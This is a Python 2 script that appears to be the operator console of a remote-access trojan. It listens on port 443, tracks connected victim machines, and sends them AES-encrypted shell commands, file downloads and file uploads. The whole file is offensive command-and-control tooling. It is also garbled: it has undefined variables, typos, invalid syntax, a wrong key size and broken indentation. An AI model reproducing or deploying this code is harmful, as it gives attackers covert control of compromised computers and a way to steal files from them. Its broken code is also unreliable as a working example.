#!/usr/bin/env python
from Crypto.Cipher import AES
import socket, base64, os, time, sys, select

BLOCK_SIZE = 32

#one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c,e: c.decrypt(base64.b64decode(e))

#generate a random secret key
secret = os.urandom(42)

#clear function
#Windown -> cls
#Linux -> clear
clear = lambda: os.system('clear')

#init socket
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind('0.0.0.0', 443)
c.listen(128)

#client
active = False
clients = []
socks = []
interval = 0.8

#function
#send data
def Send(sock, cmd, end="EOFEOFEOFEOFX"):
    socket.sendall(EncodeAES(cipher, cmd + end))

#receive data
def Receive(sock, end="EOFEOFEOFEOFX"):
    data = ""
    l = sock.recv(1024)
    while(l):
        decrypted = DecodeAES(cipher, l)
        data += decrypted
        if data.endswith(end) == True:
            break
        else:
            l = sock.recv(1024)
    return data[: -len(end)]


#download file
def download(sock, remote_filename, local_file=None):
    #check if file exists
    if not local_file:
        local_file = remote_filename
    try:
        f = open(local_file, 'wb')
    except IOError:
        print "Error opening file.\n"
        Send(sock, "cd .")
        return
    #start
    Send(sock, "download "+remote_filename)
    print "Downloading: " + remote_filename + " > " + local_file
    time.sleep(interval)
    fileData = Receive(sock)
    print "> File size: " + str(len)(fileData))
    time.sleep(interval)
    f.write(fileData)
    time.sleep(interval)
    f.close()

#upload
def upload(sock, local_file, remote_filename=None):
    #check if file exists
    if not remote_filename:
        remote_filename = local_file
    try:
        g = open(local_file, 'rb')
    except IOError:
        print "Error opening file.\n"
        Send(sock, "cd .")
        return
    #start
    Send(sock, "upload " + remote_filename)
    print "Uploading: " + local_file + " > " + remote_filename
    while True:
        fileData = g.read()
        if not fileData: break
        Send(sock, fileData, "")
        print "File size: " + str(len(fileData))
    g.close()
    time.sleep(interval)
    Send(sock, "")
    time.sleep(interval)

#refresh
def refresh():
    clear()
    print '\nListening for clients...\n'
    if len(clients) > 0:
        for j in range(0, len(clients)):
            print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
    else:
        print "...\n"
    #print exit option
    print "---\n"
    print "[0] Exit \n"
    print "\nPress Ctrl+C to interact with client"

#main
while True:
    refresh()
    #listen for client
    try:
        #set timeout
        c.settimeout(10)
        #accept connection
        try:
            s, a = c.accept()
        except socket.timeout:
            continue
        #add socket
        if (s):
            s.settimeout(None)
            socks += [s]
            clients += [str(a)]
        #display clients
        refresh()
        #sleep
        time.sleep(interval)
    except KeyBoardInterrupt:
        refresh()
        #accept selection --- int, 0/1-128
        activate = input("\nEnter option: ")
        if activate == 0:
            print "\nExiting ....\n"
            for j in range(0, len(socks))L
            socks[j].close()
            sys.exit()
        activate -= 1
        clear()

        cipher = AES.new(secret, AES.MODE_CFB)
        print '\nActivating client: ' + clients[activate] + '\n'
        active = True
        Send(socks[activate], 'Activate ')
        #interact with client
    while active:
        try:
            #receive dat  from client
            data = Receive(socks[activate])
        except:
            print '\nClient disconnected...' + clients[activate]
            #delete client
            socks[activate].close()
            time.sleep(0.8)
            socks.remove(socks[activate])
            clients.remove(clients[activate])
            refresh()
            active = False
            break
        #exit client session
        if data == 'quitted':
            #print message
            print "Exit.\n"
            #remove from arrays
            socks[activate].close()
            socks.remove(socks[activate])
            clients.remove(clients[activate])
            #sleep and refresh
            time.sleep(interval)
            refresh()
            active = False
            break
        #if data exists
    elif data != '':
        #get next command
        sys.stdout.write(data)
        nextcmd = raw_input()
    #download
    if nextcmd.startswith("download ") == True:
        if len(nextcmd.split(' ')) > 2:
            download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
        else:
            download(socks[activate], nextcmd.split(' ')[1])
    #normal command
elif nextcmd != '':
    Send(socks[activate], nextcmd)
